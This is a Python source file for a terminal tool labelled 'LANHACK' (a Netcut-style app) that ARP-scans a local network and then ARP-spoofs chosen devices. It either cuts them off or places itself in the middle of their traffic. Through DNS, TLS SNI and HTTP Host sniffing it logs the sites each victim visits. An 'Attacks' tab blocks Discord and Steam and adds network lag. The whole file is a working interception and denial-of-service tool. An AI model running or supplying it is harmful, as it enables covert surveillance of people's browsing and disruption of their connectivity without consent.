#!/usr/bin/env python3
import threading, time, os, sys, socket, struct, re, subprocess
from datetime import datetime
from collections import defaultdict

REQUIREMENTS = ["scapy>=2.5.0", "textual>=1.0.0"]
def auto_install():
    missing = []
    try: import scapy.all
    except ImportError: missing.append("scapy")
    try: import textual
    except ImportError: missing.append("textual")
    if not missing: return
    pip = sys.executable + " -m pip install --break-system-packages"
    for pkg in missing:
        req = [r for r in REQUIREMENTS if r.startswith(pkg)][0]
        print(f"[*] Installing {req}...")
        subprocess.check_call(pip.split() + [req], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

auto_install()
import scapy.all as scapy

from textual.app import App, ComposeResult
from textual.containers import Horizontal, Vertical, ScrollableContainer
from textual.widgets import Header, Footer, Button, Static, DataTable, TabbedContent, TabPane, Label, Input, RichLog, ListView, ListItem
from textual.screen import Screen
from textual.binding import Binding
from textual import events
from textual.reactive import reactive

if os.geteuid() != 0:
    print("[!] Must run as root (sudo).")
    sys.exit(1)

quit_flag = False
show_mac = True
devices = []
blocked_ips = set()
captured_sites = defaultdict(list)
spoof_threads = {}
spy_threads = {}
my_ip = ""
gateway_ip = ""
iface = ""
netmask = ""
quick_discord = False
quick_steam = False
quick_latency_ip = None
quick_tc_qdisc = False
sniff_thread = None

DISCORD_RANGES = ["162.159.0.0/16", "173.245.48.0/20", "108.162.0.0/15", "104.16.0.0/12", "131.0.72.0/22"]
STEAM_RANGES = ["208.64.200.0/22", "208.78.164.0/22", "185.25.182.0/23"]
custom_blocks = {}
_attacks_built = False
CDN_MAP = {"googlevideo.com":"youtube.com","ytimg.com":"youtube.com","ggpht.com":"youtube.com","phncdn.com":"pornhub.com","rncdn7.com":"pornhub.com","rncdn3.com":"pornhub.com","rncdn1.com":"pornhub.com","gstatic.com":"google.com","googleusercontent.com":"google.com"}
OUI_DB = {"b0:a7:b9":"TP-Link","c8:5a:cf":"HP Inc.","f0:f6:c1":"Sonos Inc.","c4:77:af":"ADB","d8:1f:12":"Tuya Smart","70:08:10":"Intel","54:44:a3":"Samsung","10:ae:60":"Amazon","a0:02:dc":"Amazon","7c:1e:52":"Amazon","e8:eb:11":"Asus","00:1a:11":"Google","00:1b:63":"Apple","00:25:00":"Apple","00:26:08":"Apple","00:26:b0":"Apple","00:50:56":"VMware","14:cc:20":"TP-Link","50:c7:6b":"TP-Link","b8:27:eb":"Raspberry Pi","dc:a6:32":"Xiaomi"}

def vendor(mac): return OUI_DB.get(mac[:8].lower(), "Unknown")

def detect_network():
    global my_ip, gateway_ip, iface, netmask
    for cmd in ["/usr/sbin/ip", "/sbin/ip", "/usr/bin/ip", "ip"]:
        try:
            out = subprocess.check_output(f"{cmd} route get 1.1.1.1", shell=True, text=True).strip()
            parts = out.split()
            for i, p in enumerate(parts):
                if p == "via" and i+1 < len(parts): gateway_ip = parts[i+1]
                if p == "dev" and i+1 < len(parts): iface = parts[i+1]
                if p == "src" and i+1 < len(parts): my_ip = parts[i+1]
            break
        except: continue
    if not gateway_ip:
        with open("/proc/net/route") as f:
            for line in f:
                fields = line.strip().split()
                if fields[1] == '00000000' and fields[2] != '00000000':
                    gateway_ip = socket.inet_ntoa(struct.pack("<I", int(fields[2], 16)))
                    iface = fields[0]; break
    if not my_ip:
        try: my_ip = scapy.get_if_addr(iface)
        except: pass
    octets = my_ip.split(".")
    if len(octets) == 4:
        netmask = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
    else:
        netmask = ""

def arp_scan(subnet=None):
    ans, _ = scapy.arping(subnet or netmask, timeout=3, verbose=False)
    found = []
    for _, recv in ans:
        try: hn = socket.gethostbyaddr(recv.psrc)[0].split('.')[0]
        except: hn = ""
        found.append({"ip":recv.psrc,"mac":recv.hwsrc,"vendor":vendor(recv.hwsrc),"hostname":hn})
    return [d for d in found if d["ip"] != my_ip]

def arp_spoof_loop(tip, tmac, gw, ev, block=True):
    mmac = scapy.get_if_hwaddr(iface)
    while ev.is_set() and not quit_flag:
        scapy.sendp(scapy.Ether(dst=tmac)/scapy.ARP(op=2,pdst=tip,psrc=gw,hwdst=tmac), verbose=False)
        if block:
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2,pdst=gw,psrc=tip,hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
        time.sleep(1.5)

def sniff_sites():
    seen = defaultdict(set)
    def cb(pkt):
        if quit_flag: return
        ts = datetime.now().strftime("%H:%M:%S")
        if pkt.haslayer(scapy.DNS) and pkt[scapy.DNS].qr == 0:
            q = pkt[scapy.DNSQR].qname.decode(errors='ignore').rstrip('.')
            if q.endswith(".in-addr.arpa") or q.endswith(".ip6.arpa"): return
            s = pkt[scapy.IP].src; d = pkt[scapy.IP].dst
            if s == my_ip or s == gateway_ip: return
            if q not in seen[s]: seen[s].add(q); captured_sites[s].append((ts,q,"dns",s,d))
        elif pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
            try:
                s=pkt[scapy.IP].src; d=pkt[scapy.IP].dst
                if s==my_ip or s==gateway_ip or s==d: return
                pl=pkt[scapy.Raw].load
                if pkt[scapy.TCP].dport==443 or pkt[scapy.TCP].sport==443:
                    if pl[0]==0x16:
                        idx=pl.find(b'\x00\x00')
                        if idx>0 and idx+2<len(pl):
                            sl=struct.unpack('>H',pl[idx:idx+2])[0]
                            if idx+2+sl<=len(pl):
                                sni=pl[idx+2:idx+2+sl].decode(errors='ignore')
                                if sni and '.' in sni and sni not in seen[s]:
                                    seen[s].add(sni); captured_sites[s].append((ts,sni,"tls",s,d))
                elif b"Host:" in pl:
                    m=re.search(rb"Host:\s*(\S+)",pl)
                    if m:
                        h=m.group(1).decode(errors='ignore')
                        if h not in seen[s]: seen[s].add(h); captured_sites[s].append((ts,h,"http",s,d))
            except: pass
    scapy.sniff(iface=iface, prn=cb, store=False, filter="udp port 53 or tcp port 80 or tcp port 443", quiet=True)

def device_label(ip):
    for d in devices:
        if d["ip"]==ip:
            n=d["hostname"] or d["vendor"]
            return f"{n} ({ip})" if n and n!="Unknown" else ip
    return ip

def main_site(domain):
    for c,m in CDN_MAP.items():
        if c in domain and m: return m
    return domain

detect_network()

class NetcutApp(App):
    CSS = """
    Screen { background: #1a1b26; }
    #header { background: #24283b; color: #a9b1d6; padding: 1; text-align: center; }
    #header Label { width: 100%; }
    #footer-bar { background: #24283b; color: #565f89; height: 1; }
    Button { margin: 0 1; min-width: 12; }
    Button:hover { text-style: bold; }
    Button.primary { background: #2ac3de; color: #1a1b26; }
    Button.error { background: #f7768e; color: #1a1b26; }
    Button.success { background: #9ece6a; color: #1a1b26; }
    Button.warning { background: #e0af68; color: #1a1b26; }
    Input.subnet { width: 28; }
    Input.target { width: 28; }
    Input.iface { width: 28; }
    #iface-row { height: 3; }
    #dev-toolbar { height: 3; }
    #action-bar { height: 3; }
    #toolbar { background: #1f2335; padding: 1 1; height: 5; }
    #toolbar Button { margin: 0 1; }
    #content { height: 1fr; }
    #stats { background: #24283b; color: #565f89; height: 1; padding: 0 2; }
    DataTable { height: 1fr; }
    DataTable > .datatable--header { background: #2f354a; color: #a9b1d6; }
    DataTable > .datatable--highlight { background: #2f354a; }
    RichLog { height: 1fr; background: #1f2335; }
    #attack-buttons { padding: 1 2; height: auto; }
    TabbedContent { height: 1fr; }
    TabPane { padding: 1; }
    #site-list { height: 1fr; }
    Label.status-active { color: #9ece6a; }
    Label.status-blocked { color: #f7768e; }
    Label.status-inactive { color: #565f89; }
    """
    
    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("r", "refresh", "Refresh"),
    ]
    
    def compose(self) -> ComposeResult:
        yield Static(f"  LANHACK  |  {iface}  |  {my_ip}  |  GW: {gateway_ip}  |  {netmask}", id="header")
        yield Static("", id="stats")
        with ScrollableContainer(id="content"):
            with TabbedContent(initial="monitor"):
                with TabPane("Monitor", id="monitor"):
                    pass
                with TabPane("Devices", id="devices"):
                    pass
                with TabPane("Attacks", id="attacks"):
                    yield Static("Loading...", id="attacks-loading")
                with TabPane("Sites", id="sites"):
                    pass
        yield Static("", id="footer-bar")
    
    def on_mount(self) -> None:
        self.query_one(TabbedContent).focus()
        self.build_device_tab()
        self.build_monitor_tab()
        self.build_sites_tab()
        self.set_interval(0.3, self._build_attacks_all, repeat=1)
        self.update_stats()
        self.set_interval(2, self.refresh_monitor)
        global iface, my_ip, netmask
        if not iface or iface == "unknown":
            try:
                iface = scapy.conf.iface
                my_ip = scapy.get_if_addr(iface)
                octets = my_ip.split(".")
                if len(octets) == 4:
                    netmask = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
            except: pass
        if not iface or iface == "unknown":
            self.notify(f"No interface detected!", severity="error", timeout=10)
        else:
            scapy.conf.iface = iface
            self.sniff_thread = threading.Thread(target=sniff_sites, daemon=True)
            self.sniff_thread.start()
            self.notify(f"Sniffing on {iface} ({my_ip})", timeout=3)
    
    def update_stats(self):
        try:
            hdr = self.query_one("#header", Static)
            hdr.update(f"  LANHACK  |  {iface}  |  {my_ip}  |  GW: {gateway_ip}  |  {netmask}")
        except: pass
        s = f" Devices: {len(devices)}  |  Blocked: {len(blocked_ips)}  |  Spies: {len(spy_threads)}  |  Captures: {sum(len(v) for v in captured_sites.values())}  |  Discord: {'ON' if quick_discord else 'OFF'}  |  Steam: {'ON' if quick_steam else 'OFF'}  |  Lag: {'ON' if quick_latency_ip else 'OFF'}"
        self.query_one("#stats").update(s)
        try:
            spy_text = f"\n[bold]Active spies:[/] {', '.join(spy_threads.keys())}" if spy_threads else ""
            self.query_one("#spy-list", Static).update(spy_text)
        except: pass
    
    def build_device_tab(self):
        pane = self.query_one("#devices")
        pane.remove_children()
        if_row = Horizontal(
            Input(placeholder=f"Interface ({iface})", id="iface-input", classes="iface"),
            Button("Set", id="set-iface-btn", variant="default"),
            id="iface-row"
        )
        pane.mount(if_row)
        tb = Horizontal(
            Input(placeholder=f"Subnet ({netmask or 'e.g. 192.168.68.0/24'})", id="subnet-input", classes="subnet"),
            Button("Scan LAN", id="scan-btn", variant="primary"),
            id="dev-toolbar"
        )
        pane.mount(tb)
        ab = Horizontal(
            Input(placeholder="Target IP (e.g. 192.168.68.56)", id="target-ip-dev", classes="target"),
            Button("All", id="spy-all-btn", variant="primary"),
            Button("Load", id="load-ip-btn", variant="default"),
            Button("Block", id="block-dev-btn", variant="error"),
            Button("Unblock", id="unblock-dev-btn", variant="warning"),
            Button("Spy", id="spy-dev-btn", variant="primary"),
            Button("Unblock All", id="unblock-all-btn", variant="warning"),
            Button("MAC", id="toggle-mac-btn", variant="default"),
            id="action-bar"
        )
        pane.mount(ab)
        dt = DataTable(id="dev-table")
        if show_mac:
            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Status")
        else:
            dt.add_columns("#", "IP", "Vendor", "Hostname", "Status")
        pane.mount(dt)
        pane.mount(Static("", id="spy-list"))
    
    def refresh_devices(self):
        if not devices: return
        try:
            old = self.query_one("#dev-table", DataTable)
            old.remove()
        except: pass
        self.call_after_refresh(self._rebuild_table)

    def _rebuild_table(self):
        try:
            pane = self.query_one("#devices")
        except: return
        dt = DataTable(id="dev-table")
        if show_mac:
            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Status")
        else:
            dt.add_columns("#", "IP", "Vendor", "Hostname", "Status")
        for i, d in enumerate(devices, 1):
            blocked = d["ip"] in blocked_ips
            status = "[red]BLOCKED[/]" if blocked else "[green]Active[/]"
            if show_mac:
                dt.add_row(str(i), d["ip"], d["mac"], d["vendor"], d["hostname"] or "-", status)
            else:
                dt.add_row(str(i), d["ip"], d["vendor"], d["hostname"] or "-", status)
        pane.mount(dt)
    
    def on_button_pressed(self, event: Button.Pressed):
        btn_id = event.button.id or ""
        if btn_id == "scan-btn": self.scan_lan()
        elif btn_id == "set-iface-btn":
            global iface
            val = self.query_one("#iface-input", Input).value.strip()
            if val:
                iface = val
                scapy.conf.iface = iface
                self.notify(f"Interface set to {iface}", timeout=2)
                self.update_stats()
        elif btn_id == "spy-all-btn":
            if not devices:
                self.notify("Scan LAN first", severity="warning", timeout=2)
            else:
                with open("/proc/sys/net/ipv4/ip_forward","w") as f: f.write("1\n")
                os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
                count = 0
                for d in devices:
                    ip = d["ip"]
                    if ip in spy_threads: continue
                    mac = d["mac"]
                    ev = threading.Event(); ev.set()
                    t = threading.Thread(target=arp_spoof_loop,args=(ip,mac,gateway_ip,ev,False),daemon=True)
                    t.start(); spy_threads[ip] = (t, ev)
                    count += 1
                self.notify(f"Spying on all {count} devices", timeout=3)
                self.update_stats()
        elif btn_id == "load-ip-btn":
            try:
                dt = self.query_one("#dev-table", DataTable)
                idx = dt.cursor_row
                if idx is not None and 0 <= idx < len(devices):
                    ip = devices[idx]["ip"]
                    self.query_one("#target-ip-dev", Input).value = ip
                    self.query_one("#target-ip", Input).value = ip
                    self.notify(f"Loaded IP: {ip}", timeout=1)
            except: pass
        elif btn_id == "toggle-mac-btn":
            global show_mac; show_mac = not show_mac
            self.refresh_devices()
            self.notify(f"MAC {'hidden' if not show_mac else 'shown'}", timeout=1)
            self.update_stats()
        elif btn_id == "unblock-all-btn": self.unblock_all()
        elif btn_id == "discord-btn": self.toggle_discord()
        elif btn_id == "steam-btn": self.toggle_steam()
        elif btn_id == "lag-btn": self.do_latency()
        elif btn_id == "clear-btn": self.clear_attacks()
        elif btn_id == "block-domain-btn":
            domain = self.query_one("#domain-input", Input).value.strip()
            if domain: self.block_domain(domain)
        elif btn_id == "unblock-domain-btn":
            domain = self.query_one("#domain-input", Input).value.strip()
            if domain: self.unblock_domain(domain)
        elif btn_id == "block-ip-btn":
            ip = self.query_one("#target-ip",Input).value.strip()
            mac = next((d["mac"] for d in devices if d["ip"]==ip), None)
            if ip and mac: self.block_device(ip); self.refresh_devices()
            elif ip: self.notify(f"Device {ip} not found. Scan LAN first.", timeout=3)
        elif btn_id == "unblock-ip-btn":
            ip = self.query_one("#target-ip",Input).value.strip()
            if ip: self.unblock_device(ip); self.refresh_devices()
        elif btn_id == "block-dev-btn":
            ip = self.query_one("#target-ip-dev",Input).value.strip()
            mac = next((d["mac"] for d in devices if d["ip"]==ip), None)
            if ip and mac: self.block_device(ip); self.refresh_devices()
            elif ip: self.notify(f"Device {ip} not found. Scan LAN first.", timeout=3)
        elif btn_id == "unblock-dev-btn":
            ip = self.query_one("#target-ip-dev",Input).value.strip()
            if ip: self.unblock_device(ip); self.refresh_devices()
        elif btn_id == "spy-dev-btn":
            ip = self.query_one("#target-ip-dev",Input).value.strip()
            if ip and ip in spy_threads:
                _, ev = spy_threads[ip]; ev.clear(); del spy_threads[ip]
                self.notify(f"Stopped spying on {ip}", timeout=2)
            elif ip:
                mac = next((d["mac"] for d in devices if d["ip"]==ip), None)
                if mac:
                    with open("/proc/sys/net/ipv4/ip_forward","w") as f: f.write("1\n")
                    os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
                    ev = threading.Event(); ev.set()
                    t = threading.Thread(target=arp_spoof_loop,args=(ip,mac,gateway_ip,ev,False),daemon=True)
                    t.start(); spy_threads[ip] = (t, ev)
                    self.notify(f"Spying on {ip}", timeout=2)
        elif btn_id == "spy-ip-btn":
            ip = self.query_one("#target-ip",Input).value.strip()
            if ip and ip in spy_threads:
                _, ev = spy_threads[ip]; ev.clear(); del spy_threads[ip]
                self.notify(f"Stopped spying on {ip}", timeout=2)
            elif ip:
                mac = next((d["mac"] for d in devices if d["ip"]==ip), None)
                if mac:
                    with open("/proc/sys/net/ipv4/ip_forward","w") as f: f.write("1\n")
                    os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
                    ev = threading.Event(); ev.set()
                    t = threading.Thread(target=arp_spoof_loop,args=(ip,mac,gateway_ip,ev,False),daemon=True)
                    t.start(); spy_threads[ip] = (t, ev)
                    self.notify(f"Spying on {ip}", timeout=2)
        self.update_stats()

    def on_data_table_row_selected(self, event: DataTable.RowSelected):
        if event.data_table.id == "dev-table":
            try:
                idx = event.data_table.cursor_row
                if idx is not None and 0 <= idx < len(devices):
                    ip = devices[idx]["ip"]
                    self.query_one("#target-ip-dev", Input).value = ip
                    self.query_one("#target-ip", Input).value = ip
            except: pass
        elif event.data_table.id == "site-table":
            try:
                idx = int(event.row_key.value)
                seen = set()
                for ip in sorted(captured_sites.keys()):
                    for ts, site, stype, src, dst in captured_sites[ip]:
                        k = f"{site}|{src}|{dst}"
                        if k not in seen: seen.add(k); st.append((ts, site, device_label(src)))
                if 0 <= idx < len(st):
                    site = st[idx][1]
                    url = f"https://{main_site(site)}"
                    os.system(f"xdg-open '{url}' 2>/dev/null &")
                    self.notify(f"Opened {url}")
            except: pass
    
    def scan_lan(self):
        global netmask
        try:
            inp = self.query_one("#subnet-input", Input).value.strip()
            subnet = inp if inp else netmask
            if not subnet:
                self.notify("Enter a subnet (e.g. 192.168.68.0/24)", severity="warning", timeout=3)
                return
            if inp: netmask = subnet
            found = arp_scan(subnet)
            global devices
            devices = found
            self.refresh_devices()
            self.update_stats()
            self.notify(f"Found {len(devices)} devices", severity="information", timeout=3)
        except Exception as e:
            self.notify(f"Scan failed: {e}", severity="error", timeout=3)
    
    def toggle_block(self, ip):
        if ip == gateway_ip or ip == my_ip:
            self.notify("Cannot block gateway or yourself", severity="warning", timeout=2)
            return
        if ip in blocked_ips:
            self.unblock_device(ip)
        else:
            self.block_device(ip)
        self.refresh_devices()
        self.update_stats()
    
    def block_device(self, ip):
        mac = next((d["mac"] for d in devices if d["ip"] == ip), None)
        if not mac: return
        blocked_ips.add(ip)
        ev = threading.Event(); ev.set()
        t = threading.Thread(target=arp_spoof_loop, args=(ip,mac,gateway_ip,ev), daemon=True)
        t.start()
        spoof_threads[ip] = (t, ev)
        self.notify(f"Blocked {ip}", severity="warning", timeout=2)
    
    def unblock_device(self, ip):
        if ip in spoof_threads:
            _, ev = spoof_threads[ip]; ev.clear(); del spoof_threads[ip]
        blocked_ips.discard(ip)
        try: scapy.send(scapy.ARP(op=2,pdst=ip,psrc=gateway_ip), verbose=False)
        except: pass
        self.notify(f"Unblocked {ip}", severity="information", timeout=2)
    
    def unblock_all(self):
        for ip in list(blocked_ips): self.unblock_device(ip)
        self.refresh_devices(); self.update_stats()
        self.notify("All devices unblocked", timeout=2)
    
    def toggle_discord(self):
        global quick_discord
        if quick_discord:
            for r in DISCORD_RANGES: os.system(f"iptables -D FORWARD -d {r} -j DROP 2>/dev/null")
            quick_discord = False
            self.notify("Discord unblocked", timeout=2)
        else:
            os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
            for r in DISCORD_RANGES: os.system(f"iptables -I FORWARD 1 -d {r} -j DROP 2>/dev/null")
            quick_discord = True
            self.notify("Discord blocked", severity="warning", timeout=2)
        self.update_stats()
        self.build_attacks_tab()
    
    def toggle_steam(self):
        global quick_steam
        if quick_steam:
            for r in STEAM_RANGES: os.system(f"iptables -D FORWARD -d {r} -j DROP 2>/dev/null")
            os.system("iptables -D FORWARD -p udp --dport 27000:27100 -j DROP 2>/dev/null")
            quick_steam = False
            self.notify("Steam unblocked", timeout=2)
        else:
            os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
            for r in STEAM_RANGES: os.system(f"iptables -I FORWARD 1 -d {r} -j DROP 2>/dev/null")
            os.system("iptables -I FORWARD 1 -p udp --dport 27000:27100 -j DROP 2>/dev/null")
            quick_steam = True
            self.notify("Steam blocked", severity="warning", timeout=2)
        self.update_stats()
        self.build_attacks_tab()
    
    def block_domain(self, domain):
        try:
            ips = set()
            for cmd in ["host", "dig +short", "nslookup"]:
                try:
                    out = subprocess.check_output(f"{cmd} {domain}", shell=True, text=True, timeout=5)
                    for ip in re.findall(r'(?:\d{1,3}\.){3}\d{1,3}', out):
                        if ip.startswith("127."): continue
                        ips.add(ip)
                    if ips: break
                except: continue
            if not ips:
                self.notify(f"Could not resolve {domain}", severity="error", timeout=5)
                return
            os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
            rules = []
            for ip in sorted(ips):
                os.system(f"iptables -I FORWARD 1 -d {ip} -j DROP 2>/dev/null")
                os.system(f"iptables -I OUTPUT 1 -d {ip} -j DROP 2>/dev/null")
                rules.append(ip)
            custom_blocks[domain] = rules
            self.notify(f"Blocked {domain}: {', '.join(sorted(ips))}", severity="warning", timeout=5)
        except Exception as e:
            self.notify(f"Error: {e}", severity="error", timeout=5)
        self.update_stats()
        self.build_attacks_tab()
    
    def unblock_domain(self, domain):
        if domain in custom_blocks:
            for ip in custom_blocks[domain]:
                os.system(f"iptables -D FORWARD -d {ip} -j DROP 2>/dev/null")
                os.system(f"iptables -D OUTPUT -d {ip} -j DROP 2>/dev/null")
            del custom_blocks[domain]
            self.notify(f"Unblocked {domain}", timeout=2)
        self.update_stats()
        self.build_attacks_tab()
    
    def do_latency(self):
        global quick_latency_ip, quick_tc_qdisc
        if quick_tc_qdisc:
            os.system(f"tc qdisc del dev {iface} root 2>/dev/null")
            quick_latency_ip = None; quick_tc_qdisc = False
            self.notify("Lag removed", timeout=2)
        else:
            if not devices:
                self.notify("Scan LAN first", severity="warning", timeout=2)
                return
            ip = devices[0]["ip"]
            os.system(f"tc qdisc add dev {iface} root handle 1: netem delay 500ms 100ms loss 5% 2>/dev/null")
            quick_latency_ip = ip; quick_tc_qdisc = True
            self.notify(f"Lag on {ip} (500ms + 5% loss)", severity="warning", timeout=2)
        self.update_stats()
        self.build_attacks_tab()
    
    def clear_attacks(self):
        global quick_discord, quick_steam, quick_latency_ip, quick_tc_qdisc
        if quick_discord: self.toggle_discord()
        if quick_steam: self.toggle_steam()
        for domain in list(custom_blocks.keys()):
            self.unblock_domain(domain)
        if quick_tc_qdisc:
            os.system(f"tc qdisc del dev {iface} root 2>/dev/null")
            quick_latency_ip = None; quick_tc_qdisc = False
        self.notify("All attacks cleared", timeout=2)
        self.update_stats()
        self.build_attacks_tab()
    
    def _build_attacks_all(self):
        global _attacks_built
        if _attacks_built: return
        _attacks_built = True
        try:
            pane = self.query_one("#attacks")
            try:
                loading = self.query_one("#attacks-loading", Static)
                if loading: loading.remove()
            except: pass
            pane.mount(Static("[bold yellow] Quick Attacks[/]", id="attacks-title"))
            pane.mount(Horizontal(
                Button("Block Discord", id="discord-btn", variant="primary"),
                Button("Block Steam", id="steam-btn", variant="primary"),
                Button("Add Lag", id="lag-btn", variant="primary"),
                Button("Clear All", id="clear-btn", variant="warning"),
                id="attack-buttons"
            ))
            pane.mount(Static("[bold]Device Actions[/]"))
            pane.mount(Horizontal(
                Input(placeholder="Target IP", id="target-ip"),
                Button("Block", id="block-ip-btn", variant="error"),
                Button("Unblock", id="unblock-ip-btn", variant="warning"),
                Button("Spy", id="spy-ip-btn", variant="primary"),
                id="dev-actions"
            ))
            pane.mount(Static("[bold]Block by Domain[/]"))
            pane.mount(Horizontal(Input(placeholder="Domain (e.g. discord.com)", id="domain-input", classes="domain-input"), id="domain-input-row"))
            pane.mount(Horizontal(
                Button("Block Domain", id="block-domain-btn", variant="error"),
                Button("Unblock Domain", id="unblock-domain-btn", variant="warning"),
                id="domain-btn-row"
            ))
            pane.mount(Static("", id="domain-status"))
        except Exception as e:
            self.notify(f"Build: {e}", severity="error", timeout=10)
    
    def build_attacks_tab(self):
        try:
            self.query_one("#discord-btn", Button).label = "Unblock Discord" if quick_discord else "Block Discord"
            self.query_one("#discord-btn", Button).variant = "error" if quick_discord else "primary"
            self.query_one("#steam-btn", Button).label = "Unblock Steam" if quick_steam else "Block Steam"
            self.query_one("#steam-btn", Button).variant = "error" if quick_steam else "primary"
            self.query_one("#lag-btn", Button).label = "Remove Lag" if quick_tc_qdisc else "Add Lag"
            self.query_one("#lag-btn", Button).variant = "warning" if quick_tc_qdisc else "primary"
            status = f"[dim]Blocked: {', '.join(custom_blocks.keys())}[/]" if custom_blocks else ""
            self.query_one("#domain-status", Static).update(status)
        except: pass
    
    def build_monitor_tab(self):
        pane = self.query_one("#monitor")
        pane.remove_children()
        rl = RichLog(id="site-log", highlight=True, markup=True)
        rl.write("[bold cyan]LANHACK Live Monitor[/]")
        rl.write("")
        rl.write("[dim]Click [bold]All[/] in the Devices tab to spy on every device.[/]")
        rl.write("[dim]Or enter an IP and click [bold]Spy[/] for a single device.[/]")
        rl.write("")
        rl.write(f"[dim]Interface: {iface} | IP: {my_ip} | Gateway: {gateway_ip}[/]")
        if not iface:
            rl.write("[red]ERROR: No interface detected![/]")
        pane.mount(rl)
    
    def refresh_monitor(self):
        log = self.query_one("#site-log", RichLog)
        if not log: return
        lines = []
        all_ips = sorted(captured_sites.keys(), key=lambda x: captured_sites[x][-1][0] if captured_sites[x] else "00:00:00", reverse=True)
        for ip in all_ips:
            if ip == my_ip or ip == gateway_ip: continue
            label = device_label(ip)
            for ts, site, stype, src, dst in captured_sites[ip][-3:]:
                icon = {"dns":"D","http":"H","tls":"T"}.get(stype,"?")
                lines.append(f"[{ts}] [{icon}] {label} -> {site}")
                break
            if len(lines) >= 8: break
        log.clear()
        total_cap = sum(len(v) for v in captured_sites.values())
        if lines:
            log.write(f"[bold cyan]Captured: {total_cap} entries | Spying: {len(spy_threads)} devices[/]")
            log.write("")
            for line in lines:
                log.write(line)
        elif not spy_threads:
            log.write("[yellow]No targets being spied on.[/]")
            log.write("[dim]Click [bold]All[/] in Devices tab to spy on every device at once.[/]")
            log.write(f"[dim]Interface: {iface} | IP: {my_ip} | Sniffer: {'running' if sniff_thread and sniff_thread.is_alive() else 'STOPPED'}[/]")
        else:
            log.write("[yellow]Sniffing active but no traffic yet...[/]")
            log.write(f"[dim]Spying on: {', '.join(spy_threads.keys())}[/]")
            log.write(f"[dim]Interface: {iface} | IP: {my_ip} | Captured: {total_cap}[/]")
            log.write("[dim]Try browsing a site on the target device.[/]")
        self.update_stats()
    
    def build_sites_tab(self):
        pane = self.query_one("#sites")
        pane.remove_children()
        sites = []
        seen = set()
        for ip in sorted(captured_sites.keys()):
            for ts, site, stype, src, dst in captured_sites[ip]:
                k = f"{site}|{src}|{dst}"
                if k not in seen: seen.add(k); sites.append((ts, site, device_label(src)))
        sites = sites[-30:]
        if not sites:
            pane.mount(Static("No sites captured yet. Go to Monitor tab to see live traffic."))
            return
        dt = DataTable(id="site-table")
        dt.add_columns("Time", "Type", "Device", "Site", "Open")
        for ts, site, dev in sites:
            opener = main_site(site)
            hint = f"-> {opener}" if opener != site else ""
            dt.add_row(ts, "DNS", dev, site, hint)
        pane.mount(dt)
    
    def action_quit(self):
        global quit_flag
        quit_flag = True
        for ip in list(spoof_threads.keys()):
            _, ev = spoof_threads[ip]; ev.clear()
        for ip in list(spy_threads.keys()):
            _, ev = spy_threads[ip]; ev.clear()
        if quick_tc_qdisc: os.system(f"tc qdisc del dev {iface} root 2>/dev/null")
        for domain in list(custom_blocks.keys()):
            for ip in custom_blocks[domain]:
                os.system(f"iptables -D FORWARD -d {ip} -j DROP 2>/dev/null")
                os.system(f"iptables -D OUTPUT -d {ip} -j DROP 2>/dev/null")
        self.exit()

if __name__ == "__main__":
    try:
        app = NetcutApp()
        app.run()
    except KeyboardInterrupt:
        pass
    finally:
        quit_flag = True
        if quick_tc_qdisc: os.system(f"tc qdisc del dev {iface} root 2>/dev/null")
        print("\n[+] Cleaned up.")
